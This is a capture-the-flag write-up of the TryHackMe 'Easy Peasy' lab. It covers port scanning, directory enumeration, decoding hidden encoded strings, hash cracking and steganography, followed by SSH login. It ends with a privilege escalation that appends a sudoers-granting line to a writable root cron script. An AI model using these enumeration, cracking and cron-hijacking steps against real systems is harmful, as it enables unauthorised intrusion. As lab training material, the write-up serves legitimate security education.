# TryHackMe - Easy Peasy (Write-Up)

_6 min read · February 25, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Easy Peasy**](https://tryhackme.com/room/easypeasyctf) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain Root Flag
- Difficulty: Easy
- Machine Author: kral4

---

## Scanning for Open Ports

The machine IP address in my case is **10.49.156.193**.

As usual:

```bash
nmap -T4 -p- 10.49.156.193
sudo nmap -sCV -p 80,6498,65524 10.49.156.193
```

![Nmap Output](./img/thm-easypeasy/Nmap-output.png)

From the scan result, I noticed that:

- HTTP (port 80) is open, running nginx 1.16.1 and `robots.txt` is available.
- SSH (port 6498) is open.
- Another HTTP (port 65524) is open and it also has `robots.txt`.

As usual, I browsed the site (port 80) first.

![Easy Peasy: Website](./img/thm-easypeasy/web.png)

I also inspected the source code and I didn't find anything useful.

Then I accessed the site on port 65524 and inspected the source code. After checking line by line, I found the **third flag**. To make it easier, run this:

```bash
curl http://10.49.156.193:65524 | grep flag
```

Next, I accessed the `robots.txt` on both ports, only port 65524 showed something interesting.

```output
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

The `User-Agent` value looks like a hash. I checked its type using [hash-identifier](https://www.kali.org/tools/hash-identifier/).

```bash
hash-identifier a18672860d0510e5ab6699730763b250
```

```output
Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

I then reversed the MD5 hash using an [online tool](https://md5.gromweb.com/?md5=a18672860d0510e5ab6699730763b250) and obtained the **second flag**.

---

## Futher Enumeration on the Website

I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate directories.

```bash
gobuster dir -u http://10.49.156.193 -w /usr/share/wordlists/dirb/common.txt
```

I found a `/hidden` directory, but nothing interesting there.

Then I enumerate the `/hidden` directory.

![Gobuster Output](./img/thm-easypeasy/gobuster-output.png)

I accessed `/whatever` and found this comment in the source code:

```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

I decoded it using **base64**:

```bash
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
```

And I got the **first flag**.

Since I found hidden HTML before, I went back to site on port 65524 and ran:

```bash
curl http://10.49.156.193:65524 | grep flag
```

```output
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

The hint 'ba' could mean base16 or 32 or 64 or etc. I then tried decoding it one by one in [CyberChef](<https://gchq.github.io/CyberChef/#recipe=From_Base62('0-9A-Za-z')&input=T2JzSm1QMTczTjJYNmRPckFnRUFMMFZ1>), and it turned out to be base62.

```output
/n0th1ng3ls3m4tt3r
```

---

## Further Further Enumeration

I then accessed `/n0th1ng3ls3m4tt3r` directory.

![Easy Peasy: Web /n0th1ng3ls3m4tt3r](./img/thm-easypeasy/web-nem.png)

Inside, I found another hash and an image file (not the background image), so I downloaded it.

I checked the hash type using [**hashcat**](https://www.kali.org/tools/hashcat/):

```bash
hashcat --show 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

![Hash Type](./img/thm-easypeasy/hash-type.png)

After testing multiple modes, I found out that it was GOST R 34.11-94.

```bash
hashcat -m 6900 -a 0 '940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81' easypeasy.txt
```

Note: `easypeasy.txt` is provided.

```output
mypasswordforthatjob
```

Next, I used that as the passphrase to extract hidden data from the downloaded image using [**steghide**](https://www.kali.org/tools/steghide/).

```bash
steghide extract -sf binarycodepixabay.jpg
```

```output
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

The password was in binary. After decoding it using CyberChef, I got:

```output
iconvertedmypasswordtobinary
```

---

## Gaining Access to SSH as Boring

Since SSH is open on port 6498, I logged in as Boring.

```bash
ssh boring@10.49.156.193 -p 6498
iconvertedmypasswordtobinary
```

Inside, I found `user.txt`:

```output
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

Since it mentioned 'Rotated', I tried one by one Caesar cipher shift and ROT13 worked. And I got the **user flag**.

---

## Privilege Escalation

As usual, once inside, I performed my privilege escalation checklist.

In `crontab`, I found this interesting entry:

```output
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

This means the script runs every minute as root.

I navigated there and checked for permission:

```bash
cd /var/www
ls -al
cat .mysecretcronjob.sh
```

![mysecretcronjob](./img/thm-easypeasy/mysecretcronjob.png)

Since script was writable, I appended:

```bash
echo 'echo "boring ALL=(ALL:ALL) ALL" >> /etc/sudoers' >> .mysecretcronjob.sh
```

After waiting a minute, I ran:

```bash
sudo -l
```

```output
User boring may run the following commands on kral4-PC:
    (ALL : ALL) ALL
```

Then I switched to root and retrieved the **root flag**.

```bash
sudo su
cd /root
cat .root.txt
```

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- identify and decode various encoding formats (Base64, Base62, binary, ROT13)
- analyze and reverse hashes
- extract hidden data from images using steganography
- abuse writable root-executed scripts to gain full system access

Thank you for reading and see you next time!
